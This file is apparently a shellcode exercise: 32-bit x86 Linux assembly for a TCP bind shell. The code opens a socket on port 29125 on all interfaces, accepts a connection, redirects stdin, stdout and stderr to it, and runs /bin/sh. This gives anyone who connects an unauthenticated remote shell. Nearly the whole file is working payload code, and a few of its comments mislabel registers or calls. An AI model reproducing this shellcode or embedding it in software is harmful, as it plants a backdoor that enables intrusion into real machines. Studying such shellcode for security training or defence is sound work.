; shell_bind_tcp.asm
;
; Author: Dennis Tan
; Date: 02-May-2020

global _start

section .text
    _start:
       
        ;  socketcall(int call, unsigned long *args);
        xor ebx, ebx            ; clear ebx register for multiplication
        mul ebx                 ; mul w 0 and store in eax edx
        mov al, 0x66            ; syscall for socketcall
        
        ; socket(int domain, int type, int protocol);
        ; socket(AF_INET, SOCK_STREAM, 0);
        push ebx                ; push value for protocol
        push 0x01               ; push value for int type SOCK_STREAM
        push 0x02               ; push value for int domain AF_INET

        mov ecx, esp            ; save argument into ecx register
        mov bl, 0x01                  ; set SYS_SOCKET in ebx register
        int 0x80                ; invoke syscall for socketcall with sys_bind
        mov esi, eax            ; save sockfd into esi for later use

        ; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        xor eax, eax            ; clear eax register
        mov al, 0x66            ; syscall for socketcall
        
        push edx                ; push 0 to listen on 0.0.0.0
        push word 0xC571        ; push port 29125
        push word 0x02          ; push AF_INET
        mov ecx, esp            ; save argument into ebx register

        push 0x10               ; addrlen
        push ecx                ; push mysockaddr
        push esi                ; push sockfd

        mov ecx, esp            ; save argument into ecx register
        mov bl, 0x02                  ; value should be 2 here - syscall for bind

        int 0x80                ; invoke syscall for socketcall with bind

        ; listen(int sockfd, int backlog);
        mov al, 0x66            ; syscall for socketcall
        mov bl, 0x04            ; syscall for listen
        push edx                ; push NULL for backlog
        push esi                ; push sockfd
        
        mov ecx, esp            ; save argument into ecx register
        int 0x80                ; invoke syscall for socketcall with listen

        ; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
        mov al, 0x66            ; syscall for socketcall
        mov bl, 0x05                  ; syscall for accept
        
        push edx                ; addrlen
        push edx                ; addr
        push esi                ; sockfd
        xor ecx, ecx            ; clear ecx register
        mov ecx, esp            ; save argument into ecx register
        int 0x80                ; invoke syscall for accept

        ; dup2(int oldfd, int newfd);
        mov ebx, eax            ; store oldfd from accept into ebx
        xor ecx, ecx            ; clear ecx register
        mov cl, 0x02            ; 2 stderr, 1 stdout, 0 stdin
        xor eax, eax            ; clear eax register

loop:
        mov al, 0x3F            ; syscall for dup2
        int 0x80                ; invoke syscall for dup2
        dec ecx                 ; decrement ecx
        jns loop                ; keep looping if ecx >=0

        ; execve("/bin/sh", char *const argv[], char *const envp[]);
        xor eax, eax            ; clear eax register
        push eax                ; null-terminator for pathname
        push 0x68732f2f         ; hs//
        push 0x6e69622f         ; nib/
        
        mov edx, eax            ; store NULL into envp
        mov ecx, eax            ; store NULL into argv
        mov ebx, esp            ; save pathname to ebx

        mov al, 0xb             ; syscall for execve
        int 0x80                ; invoke syscall for execve
